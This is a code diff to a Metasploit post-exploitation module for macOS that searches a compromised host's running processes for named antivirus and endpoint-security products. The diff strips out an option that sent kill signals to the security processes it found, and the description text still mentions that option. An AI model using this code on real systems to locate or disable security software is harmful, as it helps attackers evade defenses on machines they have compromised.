@@ -14,11 +14,11 @@ class MetasploitModule < Msf::Post
         info,
         'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate and disable antivirus products',
         'Description' => %q{
-          This module enumerates OSX systems for the presence of antivirus and other defensive products. This module functions by enumerating 
-          the running processes on a device. The CUSTOM_PRODS option specifies
-          a file which contains a list of additional security products to hunt for, each of which will be seperated by a new
-          line character. All searching will be done grep wise, therefore you don't need to pass in a specific file or process name. If run
-          with root privilleges the KILL_PROCESSES option will send a kill signal to the security processes detected by this module.
+          This module enumerates OSX systems for the presence of defensive products by enumerating the processes
+          running on the device.  The CUSTOM_PRODS option specifies
+          a file which contains a list of additional security products to hunt for, each of which will be seperated by
+          a newline character.  If run with root privilleges the KILL_PROCESSES option will attempt to send a kill
+          signal to all of the security related processes detected by this module.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -29,7 +29,12 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => ['meterpreter'],
         'References' => [
           ['URL', 'https://objective-see.org/tools.html']
-        ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
 
   )
@@ -41,7 +46,6 @@ class MetasploitModule < Msf::Post
                         false,
                         'File containing a list of AV products to hunt for. Each value should be seperated by a newline character and matching will be done in a case insensitive fashion', nil
                       ]),
-        OptBool.new('KILL_PROCESSES', [false, 'Send a SIGKILL signal to all of the processes this module finds, including custom processes. Root permissions are required.'])
       ]
     )
   end
@@ -50,34 +54,38 @@ class MetasploitModule < Msf::Post
   # reads a file and returns each line as an element in an array
   def file_to_array(file)
     f = File.open file
-    f.readlines.map(&chomp)
+    f.readlines.map(&:chomp)
   end
 
   def enum_processes(product)
     @processes.each do |process|
-      if process['name'].include? product.to_s
-        @av_processes.push(process)
-        print_good("Found potential process artifact for #{product}: #{process.inspect}")
-        # following post/linux/gather/enum_protections.rb
-        report_note(
-          host: session,
-          type: 'osx.protection',
-          data: {"#{product}": process.inspect} # need to test this
-          update: :unique_data
-        )
-      end
+      # change capitalization on process name and our products so we don't have to deal with funky regexes
+      name = process['name'].downcase
+
+      next unless name.include?(product.downcase)
+
+      print_good("Found potential process artifact for #{product}: #{process.inspect}")
+
+      # following post/linux/gather/enum_protections.rb
+      report_note(
+        host: session,
+        type: 'osx.protection',
+        data: { "#{product}": process.inspect }, # need to test this
+        update: :unique_data
+      )
     end
   end
 
   def run
-    products = ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight', 'CrowdStrike', 
-                'Jamf', 'Netskope', 'Qualys', 'NetSkope', 'BitDefender', 'Symantec']
+    products = [
+      'LuLu', 'BlockBlock', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight', 'CrowdStrike',
+      'Jamf', 'NetSkope', 'Qualys', 'NetSkope', 'BitDefender', 'Symantec'
+    ]
 
     print_status('Retrieving process list...')
     @processes = get_processes
 
     print_status('Hunting processes for AV products...')
-    @av_processes = {}
 
     products.each do |prod|
       enum_processes prod
@@ -88,15 +96,6 @@ class MetasploitModule < Msf::Post
       av = file_to_array file
       av.each do |prod|
         enum_processes prod
-      end
-    end
-
-    if datastore['KILL_PROCESSES']
-      print_status "Killing AV PID's"
-      fail_with(Failure::NoAccess, "Root permissions are required to kill AV processes") unless is_root?
-      @av_proccess.each do |process|
-        res = kill_process process['pid']
-        print_status "kill signal for #{process['name']} #{process['pid']} = #{res}"
       end
     end
   end
